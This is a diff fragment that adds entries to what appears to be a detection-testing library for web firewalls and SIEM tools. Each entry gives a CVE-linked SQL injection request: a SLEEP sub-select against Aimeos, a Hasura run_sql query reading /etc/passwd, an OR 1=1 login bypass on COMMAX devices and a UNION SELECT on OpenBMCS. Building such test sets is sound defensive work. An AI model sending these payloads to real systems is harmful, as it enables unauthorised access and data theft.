+    "description": "Aimeos 2021.10 LTS is vulnerable to SQL injection in the JSON API sort parameter of the jsonapi/review endpoint, reachable by a crafted GET request. This request injects a SQL sub-select/SLEEP payload in the sort parameter. No vendor WAF rule found; built from the ExploitDB PoC and CVE description.\n\nReferences used to recreate this request:\n- https://www.exploit-db.com/exploits/50538 (PoC - blocked at fetch time, used via CVE/metadata)\n- https://www.cve.org/CVERecord?id=CVE-2021-47763 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /jsonapi/review?sort=id%2C(select*from(select(sleep(5)))a) HTTP/1.1\nHost: {{target_host}}\n\n"
+    },
+    "cves": [
+      "CVE-2021-47763"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_exploitdb for CVE-2021-47763",
+        "link": "https://www.exploit-db.com/exploits/50538"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-47714 - Hasura GraphQL Engine SQL Injection (Local File Read)",
+    "displayName": "CVE-2021-47714 - Hasura GraphQL Engine SQL Injection (Local File Read)",
+    "description": "Hasura GraphQL Engine 1.3.3 allows arbitrary local file read through SQL injection by abusing the PostgreSQL pg_read_file() function via the schema/metadata query endpoint. This request sends a run_sql operation that calls pg_read_file('/etc/passwd'), triggering both SQLi (CRS 942) and LFI (CRS 930 /etc/passwd) signatures. No vendor WAF rule found; built from the ExploitDB PoC and CVE description. The /v1/query endpoint and POST method are the standard Hasura schema API (FLAGGED as inferred from the Hasura API).\n\nReferences used to recreate this request:\n- https://www.exploit-db.com/exploits/49790 (PoC - blocked at fetch time, used via CVE/metadata)\n- https://www.vulncheck.com/advisories/hasura-graphql-local-file-read-via-sql-injection (advisory)\n- https://www.cve.org/CVERecord?id=CVE-2021-47714 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /v1/query HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/json\nX-Hasura-Admin-Secret: dummy\n\n{\"type\":\"run_sql\",\"args\":{\"sql\":\"SELECT pg_read_file('/etc/passwd')\",\"cascade\":false,\"read_only\":false}}\n"
+    },
+    "cves": [
+      "CVE-2021-47714"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 4,
+    "platforms": [
+      "sql",
+      "linux"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_exploitdb for CVE-2021-47714",
+        "link": "https://www.exploit-db.com/exploits/49790"
+      },
+      {
+        "title": "advisory_vulncheck for CVE-2021-47714",
+        "link": "https://www.vulncheck.com/advisories/hasura-graphql-local-file-read-via-sql-injection"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-47708 - COMMAX Smart Home IoT Control System SQL Injection",
+    "displayName": "CVE-2021-47708 - COMMAX Smart Home IoT Control System SQL Injection",
+    "description": "COMMAX Smart Home System CDP-1020n is vulnerable to authentication-bypass SQL injection via the id parameter of loginstart.asp, exploited with a POST request carrying a malicious id value. This request sends a classic OR-based SQL injection in id. No vendor WAF rule found; built from the ExploitDB / ZeroScience PoC and CVE description.\n\nReferences used to recreate this request:\n- https://www.exploit-db.com/exploits/50207 (PoC - blocked at fetch time, used via CVE/metadata)\n- https://www.zeroscience.mk/en/vulnerabilities/ZSL-2021-5662.php (advisory)\n- https://www.cve.org/CVERecord?id=CVE-2021-47708 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /loginstart.asp HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\n\nid=%27%20OR%201%3D1--%20-&passwd=dummy\n"
+    },
+    "cves": [
+      "CVE-2021-47708"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 4,
+    "platforms": [
+      "windows",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_exploitdb for CVE-2021-47708",
+        "link": "https://www.exploit-db.com/exploits/50207"
+      },
+      {
+        "title": "advisory_zeroscience for CVE-2021-47708",
+        "link": "https://www.zeroscience.mk/en/vulnerabilities/ZSL-2021-5662.php"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-47704 - OpenBMCS SQL Injection",
+    "displayName": "CVE-2021-47704 - OpenBMCS SQL Injection",
+    "description": "OpenBMCS 2.4 is vulnerable to authenticated SQL injection via the id parameter of /debug/obix_test.php, reachable by a GET request. This request sends a UNION SELECT payload in id. No vendor WAF rule found; built from the ExploitDB / ZeroScience PoC and CVE description.\n\nReferences used to recreate this request:\n- https://www.exploit-db.com/exploits/50668 (PoC - blocked at fetch time, used via CVE/metadata)\n- https://www.vulncheck.com/advisories/openbmcs-sql-injection-via-obixtestphp (advisory)\n- https://www.cve.org/CVERecord?id=CVE-2021-47704 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /debug/obix_test.php?id=-1%20UNION%20SELECT%201,2,3,database()--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2021-47704"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_exploitdb for CVE-2021-47704",
+        "link": "https://www.exploit-db.com/exploits/50668"
+      },
+      {
+        "title": "advisory_vulncheck for CVE-2021-47704",
+        "link": "https://www.vulncheck.com/advisories/openbmcs-sql-injection-via-obixtestphp"
       }
     ],
     "public": false,
